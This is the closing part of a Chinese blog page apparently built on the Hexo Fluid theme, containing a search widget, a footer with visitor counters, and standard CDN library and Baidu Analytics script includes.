        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <i class="iconfont icon-love" style="color: #8080ff"></i> <i class="iconfont icon-love" style="color: red"></i> <i class="iconfont icon-love" style="color: #8080ff"></i> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  
  <!-- 备案信息 -->
  <div class="beian">
    <span>
      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
        
      </a>
    </span>
    
  </div>


  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  
    <!-- Baidu Analytics -->
    <script defer>
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?e71cddb60357a788e6ed79bca37db76d";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
